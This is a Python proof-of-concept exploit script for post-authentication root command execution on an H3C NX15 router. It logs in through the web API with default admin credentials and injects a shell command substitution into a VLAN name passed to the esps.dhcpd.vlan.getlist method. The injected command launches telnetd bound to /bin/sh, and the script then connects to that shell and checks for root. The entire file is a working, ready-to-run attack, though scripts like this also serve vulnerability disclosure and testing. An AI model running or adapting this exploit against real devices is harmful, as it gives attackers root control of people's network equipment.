#!/usr/bin/env python3
import argparse
import json
import socket
import sys
import time

import requests


def log(msg: str) -> None:
    print(msg, flush=True)


def login(base: str, username: str, password: str) -> str:
    r = requests.post(
        base.rstrip("/") + "/api/login/auth",
        json={"username": username, "password": password},
        timeout=10,
    )
    r.raise_for_status()
    body = r.json()
    if body.get("code") != 0:
        raise RuntimeError(f"login failed: {body}")
    return body["data"]["session"]


def esps(base: str, session: str, body, timeout: int = 30):
    headers = {"AUTHENTICATION": session, "Content-Type": "application/json"}
    r = requests.post(base.rstrip("/") + "/api/esps", headers=headers, data=json.dumps(body), timeout=timeout)
    r.raise_for_status()
    try:
        return r.json()
    except Exception:
        return r.text


def wait_port(host: str, port: int, timeout: int = 20) -> bool:
    end = time.time() + timeout
    while time.time() < end:
        s = socket.socket()
        s.settimeout(1.5)
        try:
            s.connect((host, port))
            return True
        except Exception:
            time.sleep(1)
        finally:
            try:
                s.close()
            except Exception:
                pass
    return False


def connect_shell(host: str, port: int, timeout: float = 5.0):
    s = socket.socket()
    s.settimeout(timeout)
    s.connect((host, port))
    time.sleep(0.3)
    banner = b""
    try:
        banner += s.recv(4096)
    except Exception:
        pass
    return s, banner


def run_shell_cmd(sock: socket.socket, cmd: str, end_marker: str = "__END__") -> str:
    sock.sendall(f"{cmd}; echo {end_marker}\n".encode())
    time.sleep(0.6)
    data = b""
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
            if end_marker.encode() in data or len(data) > 65535:
                break
    except Exception:
        pass
    return data.decode("latin1", "ignore")


def build_payload(port: int, marker: str, marker_path: str, vlan_prefix: str) -> str:
    cmd = f"echo {marker} >{marker_path}; /usr/sbin/telnetd -p {port} -l /bin/sh >/dev/null 2>&1"
    return f"{vlan_prefix}$({cmd})"


def cleanup(host: str, port: int, marker_path: str):
    try:
        sock, _ = connect_shell(host, port, timeout=4.0)
        kill_cmd = (
            f"pid=$(ps w | awk '/telnetd -p {port}/ && !/awk/ {{print $1}}' | head -n1); "
            f'[ -n "$pid" ] && kill "$pid"; rm -f {marker_path}; echo cleaned'
        )
        out = run_shell_cmd(sock, kill_cmd)
        log("[*] cleanup shell output:")
        print(out)
        sock.close()
    except Exception as e:
        log(f"[!] cleanup shell failed: {e}")


def main() -> int:
    ap = argparse.ArgumentParser(
        description="H3C NX15 R017 post-auth root RCE via esps.dhcpd.vlan.getlist eval injection"
    )
    ap.add_argument("--base", default="http://192.168.8.1", help="router base URL")
    ap.add_argument("--username", default="admin", help="web admin username")
    ap.add_argument("--password", default="admin123", help="web admin password")
    ap.add_argument("--host", default="192.168.8.1", help="host used for shell connection")
    ap.add_argument("--port", type=int, default=2481, help="temporary telnetd shell port")
    ap.add_argument(
        "--vlan-prefix",
        default="VLAN1",
        help="string prefix used before the injected command substitution",
    )
    ap.add_argument("--delay", type=float, default=1.0, help="seconds to wait before checking shell")
    ap.add_argument("--cleanup", action="store_true", help="kill temporary shell and remove marker after verification")
    args = ap.parse_args()

    marker = "DHCPD_VLAN_GETLIST_RCE_OK"
    marker_path = "/tmp/dhcpd_vlan_getlist_rce_marker"
    injected_vlan = build_payload(args.port, marker, marker_path, args.vlan_prefix)

    log("[*] Step 1: login")
    session = login(args.base, args.username, args.password)
    log(f"[*] session = {session}")

    log("[*] Step 2: trigger esps.dhcpd.vlan.getlist with injected VLAN name")
    body = [
        {
            "id": 1,
            "object": "esps.dhcpd.vlan",
            "method": "getlist",
            "param": {"list": [injected_vlan]},
        }
    ]
    resp = esps(args.base, session, body)
    print(json.dumps(resp, ensure_ascii=False, indent=2) if not isinstance(resp, str) else resp)
    log("[*] Note: business logic may still return code 3083 (Unknown VLAN); command execution happens before that validation.")

    log(f"[*] Step 3: wait up to {args.delay:.1f}s + port probe for shell on {args.host}:{args.port}")
    time.sleep(args.delay)
    if not wait_port(args.host, args.port, timeout=12):
        log("[-] FAILED: temporary shell port did not open")
        return 1

    log("[*] Step 4: connect shell and verify root execution")
    sock, banner = connect_shell(args.host, args.port)
    print(banner.decode("latin1", "ignore"))
    proof = run_shell_cmd(sock, f"id; uname -a; cat {marker_path} 2>/dev/null")
    print(proof)
    ok = ("uid=0(root)" in proof) and (marker in proof)
    sock.close()

    if args.cleanup:
        cleanup(args.host, args.port, marker_path)

    if ok:
        log("[+] SUCCESS: root RCE via esps.dhcpd.vlan.getlist")
        return 0

    log("[-] FAILED: expected proof not found")
    return 1


if __name__ == "__main__":
    sys.exit(main())
